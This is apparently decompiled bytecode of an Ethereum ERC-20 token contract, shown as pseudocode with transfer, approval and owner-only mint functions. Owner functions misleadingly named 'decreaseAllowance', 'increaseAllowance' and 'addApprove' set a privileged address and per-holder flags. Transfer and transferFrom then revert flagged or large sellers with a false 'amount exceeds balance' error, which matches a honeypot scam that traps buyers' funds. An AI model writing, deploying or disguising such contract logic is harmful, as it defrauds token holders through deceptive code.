contract main {




// =====================  Runtime code  =====================


#
#  - multiTransfer(uint256 arg1, address[] arg2, uint256[] arg3)
#
mapping of uint256 balanceOf;
mapping of uint8 stor1;
mapping of uint8 stor2;
uint256 stor3;
mapping of uint256 allowance;
uint256 totalSupply;
array of uint256 name;
array of uint256 symbol;
uint8 decimals;
address _owner;
address stor11;
address stor12;

function name() payable {
    return name[0 len name.length]
}

function totalSupply() payable {
    return totalSupply
}

function decimals() payable {
    return decimals
}

function balanceOf(address arg1) payable {
    require calldata.size - 4 >= 32
    return balanceOf[address(arg1)]
}

function symbol() payable {
    return symbol[0 len symbol.length]
}

function _owner() payable {
    return _owner
}

function allowance(address arg1, address arg2) payable {
    require calldata.size - 4 >= 64
    return allowance[address(arg1)][address(arg2)]
}

function _fallback() payable {
    revert
}

function decreaseAllowance(address arg1) payable {
    require calldata.size - 4 >= 32
    if _owner != msg.sender:
        revert with 0, '!owner'
    stor11 = arg1
}

function _mint(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    if _owner != msg.sender:
        revert with 0, 'ERC20: mint to the zero address'
    if totalSupply + arg2 < totalSupply:
        revert with 0, 'SafeMath: addition overflow'
    totalSupply += arg2
    if balanceOf[stor10] + arg2 < balanceOf[stor10]:
        revert with 0, 'SafeMath: addition overflow'
    balanceOf[stor10] += arg2
    emit Transfer(arg2, 0, arg1);
}

function addApprove(address[] arg1) payable {
    require calldata.size - 4 >= 32
    require arg1 <= 4294967296
    require arg1 + 36 <= calldata.size
    require arg1.length <= 4294967296 and arg1 + (32 * arg1.length) + 36 <= calldata.size
    mem[128 len 32 * arg1.length] = call.data[arg1 + 36 len 32 * arg1.length]
    mem[(32 * arg1.length) + 128] = 0
    if _owner != msg.sender:
        revert with 0, '!owner'
    idx = 0
    while idx < arg1.length:
        require idx < arg1.length
        stor2[mem[(32 * idx) + 140 len 20]] = 1
        require idx < arg1.length
        mem[0] = mem[(32 * idx) + 140 len 20]
        mem[32] = 1
        stor1[mem[(32 * idx) + 140 len 20]] = 0
        idx = idx + 1
        continue 
}

function increaseAllowance(address[] arg1) payable {
    require calldata.size - 4 >= 32
    require arg1 <= 4294967296
    require arg1 + 36 <= calldata.size
    require arg1.length <= 4294967296 and arg1 + (32 * arg1.length) + 36 <= calldata.size
    mem[128 len 32 * arg1.length] = call.data[arg1 + 36 len 32 * arg1.length]
    mem[(32 * arg1.length) + 128] = 0
    if _owner != msg.sender:
        revert with 0, '!owner'
    idx = 0
    while idx < arg1.length:
        require idx < arg1.length
        stor1[mem[(32 * idx) + 140 len 20]] = 1
        require idx < arg1.length
        mem[0] = mem[(32 * idx) + 140 len 20]
        mem[32] = 2
        stor2[mem[(32 * idx) + 140 len 20]] = 0
        idx = idx + 1
        continue 
}

function approve(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    36,
                    0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573,
                    mem[200 len 28]
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    34,
                    0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573,
                    mem[198 len 30]
    allowance[address(msg.sender)][address(arg1)] = arg2
    emit Approval(arg2, msg.sender, arg1);
    return 1
}

function transfer(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    if _owner != stor11:
        if msg.sender == _owner:
            if msg.sender == arg1:
                stor3 = arg2
        else:
            if msg.sender == stor11:
                if msg.sender == _owner:
                    if msg.sender == arg1:
                        stor3 = arg2
            else:
                if arg1 == _owner:
                    if msg.sender == _owner:
                        if msg.sender == arg1:
                            stor3 = arg2
                else:
                    if bool(stor1[address(msg.sender)]) != 1:
                        if bool(stor2[address(msg.sender)]) == 1:
                            if stor11 != msg.sender:
                                if arg1 != stor12:
                                    revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                                                32,
                                                38,
                                                0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                                                mem[202 len 26]
                        else:
                            if arg2 >= stor3:
                                if stor11 != msg.sender:
                                    if arg1 != stor12:
                                        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                                                    32,
                                                    38,
                                                    0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                                                    mem[202 len 26]
                            else:
                                if arg1 == stor11:
                                    stor2[address(msg.sender)] = 1
                                    stor1[address(msg.sender)] = 0
    else:
        if msg.sender == _owner:
            stor11 = arg1
        else:
            if msg.sender == stor11:
                if msg.sender == _owner:
                    if msg.sender == arg1:
                        stor3 = arg2
            else:
                if arg1 == _owner:
                    if msg.sender == _owner:
                        if msg.sender == arg1:
                            stor3 = arg2
                else:
                    if bool(stor1[address(msg.sender)]) != 1:
                        if bool(stor2[address(msg.sender)]) == 1:
                            if stor11 != msg.sender:
                                if arg1 != stor12:
                                    revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                                                32,
                                                38,
                                                0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                                                mem[202 len 26]
                        else:
                            if arg2 >= stor3:
                                if stor11 != msg.sender:
                                    if arg1 != stor12:
                                        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                                                    32,
                                                    38,
                                                    0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                                                    mem[202 len 26]
                            else:
                                if arg1 == stor11:
                                    stor2[address(msg.sender)] = 1
                                    stor1[address(msg.sender)] = 0
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    37,
                    0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573,
                    mem[201 len 27]
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    35,
                    0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573,
                    mem[199 len 29]
    if arg2 > balanceOf[address(msg.sender)]:
        revert with 0, 
                    32,
                    38,
                    0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                    mem[166 len 26],
                    mem[218 len 6]
    balanceOf[address(msg.sender)] -= arg2
    if balanceOf[address(arg1)] + arg2 < balanceOf[address(arg1)]:
        revert with 0, 'SafeMath: addition overflow'
    balanceOf[address(arg1)] += arg2
    emit Transfer(arg2, msg.sender, arg1);
    return 1
}

function transferFrom(address arg1, address arg2, uint256 arg3) payable {
    require calldata.size - 4 >= 96
    if _owner != stor11:
        if arg1 == _owner:
            if arg1 == arg2:
                stor3 = arg3
        else:
            if arg1 == stor11:
                if arg1 == _owner:
                    if arg1 == arg2:
                        stor3 = arg3
            else:
                if arg2 == _owner:
                    if arg1 == _owner:
                        if arg1 == arg2:
                            stor3 = arg3
                else:
                    if bool(stor1[address(arg1)]) != 1:
                        if bool(stor2[address(arg1)]) == 1:
                            if arg1 != stor11:
                                if arg2 != stor12:
                                    revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                                                32,
                                                38,
                                                0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                                                mem[202 len 26]
                        else:
                            if arg3 >= stor3:
                                if arg1 != stor11:
                                    if arg2 != stor12:
                                        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                                                    32,
                                                    38,
                                                    0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                                                    mem[202 len 26]
                            else:
                                if arg2 == stor11:
                                    stor2[address(arg1)] = 1
                                    stor1[address(arg1)] = 0
    else:
        if arg1 == _owner:
            stor11 = arg2
        else:
            if arg1 == stor11:
                if arg1 == _owner:
                    if arg1 == arg2:
                        stor3 = arg3
            else:
                if arg2 == _owner:
                    if arg1 == _owner:
                        if arg1 == arg2:
                            stor3 = arg3
                else:
                    if bool(stor1[address(arg1)]) != 1:
                        if bool(stor2[address(arg1)]) == 1:
                            if arg1 != stor11:
                                if arg2 != stor12:
                                    revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                                                32,
                                                38,
                                                0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                                                mem[202 len 26]
                        else:
                            if arg3 >= stor3:
                                if arg1 != stor11:
                                    if arg2 != stor12:
                                        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                                                    32,
                                                    38,
                                                    0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                                                    mem[202 len 26]
                            else:
                                if arg2 == stor11:
                                    stor2[address(arg1)] = 1
                                    stor1[address(arg1)] = 0
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    37,
                    0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573,
                    mem[201 len 27]
    if not arg2:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    35,
                    0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573,
                    mem[199 len 29]
    if arg3 > balanceOf[address(arg1)]:
        revert with 0, 
                    32,
                    38,
                    0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                    mem[166 len 26],
                    mem[218 len 6]
    balanceOf[address(arg1)] -= arg3
    if balanceOf[address(arg2)] + arg3 < balanceOf[address(arg2)]:
        revert with 0, 'SafeMath: addition overflow'
    balanceOf[address(arg2)] += arg3
    emit Transfer(arg3, arg1, arg2);
    if arg3 > allowance[address(arg1)][address(msg.sender)]:
        revert with 0, 
                    32,
                    40,
                    0x6545524332303a207472616e7366657220616d6f756e74206578636565647320616c6c6f77616e63,
                    mem[264 len 24],
                    mem[312 len 8]
    if not arg1:
        revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[392 len 28]
    if not msg.sender:
        revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[390 len 30]
    allowance[address(arg1)][address(msg.sender)] -= arg3
    emit Approval((allowance[address(arg1)][address(msg.sender)] - arg3), arg1, msg.sender);
    return 1
}



}
